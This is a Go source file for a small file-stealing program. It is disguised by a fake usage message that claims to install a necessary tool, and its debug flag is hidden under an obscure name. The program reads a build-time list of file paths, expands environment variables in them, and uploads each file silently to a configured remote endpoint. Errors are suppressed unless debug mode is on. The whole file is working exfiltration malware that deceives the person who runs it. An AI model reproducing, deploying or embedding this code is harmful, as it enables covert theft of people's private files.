package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

var FileList string
var Endpoint string

var usage string

func main() {
	// hide debug functionnality
	var debug bool
	flag.BoolVar(&debug, "thisisdebug", false, "")
	// fake usage
	usage = `
	Execute file to install necessary tool. (For security reasons the process does not require privilege)
	`
	flag.Usage = func() { fmt.Print(usage) }
	flag.Parse()

	//unflat file list
	sFileList := strings.Split(FileList, "\n")

	if debug {
		fmt.Println("files:")
		for i := 0; i < len(sFileList); i++ {
			fmt.Println(sFileList[i])
		}

		fmt.Println("endpoint:", Endpoint)
	}

	// send file
	client := &http.Client{}
	for i := 0; i < len(sFileList); i++ {
		err := SendFile(client, Endpoint, sFileList[i])
		if err != nil && debug {
			fmt.Println(sFileList[i])
			fmt.Println("error:", err)
		}
	}

}

func SendFile(client *http.Client, endpoint string, filename string) (codeerr error) {
	// file exists?
	data, err := os.Open(os.ExpandEnv(filename))
	if err != nil {
		//surely file does not exist -> stop
		return err
	}

	// send file
	values := map[string]io.Reader{
		"file": data,
	}

	err = Upload(client, endpoint, values)
	if err != nil {
		return err
	}

	return err
}

func Upload(client *http.Client, url string, values map[string]io.Reader) (err error) {
	// Prepare a form that you will submit to that URL.
	var b bytes.Buffer
	w := multipart.NewWriter(&b)
	for key, r := range values {
		var fw io.Writer
		if x, ok := r.(io.Closer); ok {
			defer x.Close()
		}
		// Add an image file
		if x, ok := r.(*os.File); ok {

			if fw, err = w.CreateFormFile(key, x.Name()+"-"+strconv.Itoa(time.Now().Nanosecond())); err != nil { //weird name to avoid collision
				return err
			}
		} else {
			// Add other fields
			if fw, err = w.CreateFormField(key); err != nil {
				return err
			}
		}
		if _, err = io.Copy(fw, r); err != nil {
			return err
		}

	}

	w.Close()

	req, err := http.NewRequest("POST", url, &b)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", w.FormDataContentType())

	// Submit the request
	res, err := client.Do(req)
	if err != nil {
		return err
	}

	// Check the response
	if res.StatusCode != http.StatusOK {
		err = fmt.Errorf("bad status: %s", res.Status)
	}
	return err
}
